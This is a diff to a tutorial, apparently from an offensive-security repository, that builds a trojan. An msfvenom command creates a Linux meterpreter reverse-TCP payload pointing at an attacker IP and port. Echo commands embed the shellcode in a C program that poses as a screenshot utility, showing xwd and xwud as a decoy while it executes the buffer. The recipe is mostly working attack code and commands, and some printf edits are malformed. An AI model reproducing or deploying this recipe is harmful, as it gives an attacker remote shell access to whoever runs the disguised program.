@@ -82,9 +82,9 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 
 - **'Msfvenom Syntax'**
   - -p payload name
-  - -b delete nul bites from shellcode
+  - -b delete nul bites from shellcode **\x00**
   - -a payload arch
-  - -f payload format
+  - -f shellcode format
   - -o write output to a file 
 
 <br />
@@ -114,6 +114,7 @@ are creating it using the follow commands described in the next grey box.<br />
 <br />
 
 #### :: Insert the C shellcode created into a C program
+# TODO: printf() misses ",strlen(buf)); and & for multi-thread ???
 
 ```
 echo "#include<stdio.h>" > payload.c
@@ -124,10 +125,10 @@ echo "unsigned char buf[] = \"$pa\";" >> payload.c
 echo "" >> payload.c
 echo "int main()" >> payload.c
 echo "{" >> payload.c
-echo "  printf(\"[i] Please Wait, Taking Screenshot ..\");" >> payload.c
+echo "  printf(\"[i] Please Wait, Taking Screenshot ..\", strlen(buf));" >> payload.c
 echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
-echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\");" >> payload.c
-echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd\");" >> payload.c
+echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\", strlen(buf));" >> payload.c
+echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd &\");" >> payload.c
 echo "  void (*ret)() = (void(*)())buf;" >> payload.c
 echo "  ret();" >> payload.c
 echo "}" >> payload.c
